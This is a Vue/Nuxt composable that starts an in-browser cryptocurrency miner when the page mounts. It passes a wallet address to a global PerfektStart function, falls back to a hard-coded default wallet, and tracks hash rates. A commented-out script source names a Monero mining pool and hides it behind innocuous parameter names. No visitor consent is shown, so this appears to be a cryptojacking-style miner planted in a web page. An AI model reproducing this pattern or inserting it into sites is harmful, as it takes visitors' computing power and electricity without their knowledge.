
import { ref, onMounted, nextTick } from 'vue';
import { useRoute, useRouter } from 'vue-router';
import { useSupabase } from '~/composables/useSupabase';
import { useHead } from '#imports';

export function useAltyn() {
    const wallet = ref("");
    const totalhashes = ref(0);
    const hashesPerSecond = ref(0);
    const acceptedhashes = ref(0);
    const id = ref(0);

    const route = useRoute();
    const router = useRouter();
    const supabase = useSupabase();

    const DEFAULT_WALLET = "4BCMDQB1dZV9KN9ZYo4RH3cHTAL9jUocL474pnSDaRJoeUndmWqc8KefKUoFRnczupixisqBy1uiqQES2oSgF9594vrt3St";

    const loadWallet = async () => {
        const routeId = route.params.id;

        if (routeId) {
            const { data, error } = await supabase
                .from('users')
                .select('wallet')
                .eq('id', routeId)
                .single();

            if (data?.wallet) {
                wallet.value = data.wallet;
                return;
            } else {
                // Если указан ID, но пользователя не нашли — редирект
                await nextTick();
                router.push('/');
                return;
            }
        }

        // Если нет ID — ищем в localStorage
        if (typeof window !== 'undefined' && window.localStorage) {
            const storedWallet = localStorage.getItem("wallet");
            if (storedWallet) {
                wallet.value = storedWallet;
                return;
            }
        }

        // Фолбэк — дефолтный кошелек
        wallet.value = DEFAULT_WALLET;
    };

    const loadScript = () => {
        useHead({
            script: [
                {
                    //src: `/altyn.js?perfekt=wss://?algo=cn/r?jason=pool.hashvault.pro:443`,
                    async: false
                }
            ]
        });
    };

    onMounted(async () => {
        await loadWallet();
        //loadScript();

        const waitForPerfekt = () => {
            if (window.PerfektStart) {
                window.PerfektStart(wallet.value, "OG", 2);
            } else {
                setTimeout(waitForPerfekt, 1000);
            }
        };
        waitForPerfekt();

        let lastTotalHashes = window.totalhashes || 0;
        let lastrate = 0;

        setInterval(() => {
            totalhashes.value = window.totalhashes || 0;
            const currentTotalHashes = window.totalhashes || 0;
            const diff = currentTotalHashes - lastTotalHashes;
            lastTotalHashes = currentTotalHashes;

            lastrate = (diff * 0.5) + (lastrate * 0.5);
            hashesPerSecond.value = lastrate.toFixed(2);
            acceptedhashes.value = window.acceptedhashes || 0;
        }, 5000);
    });

    return {
        wallet,
        totalhashes,
        hashesPerSecond,
        acceptedhashes,
        id
    };
}
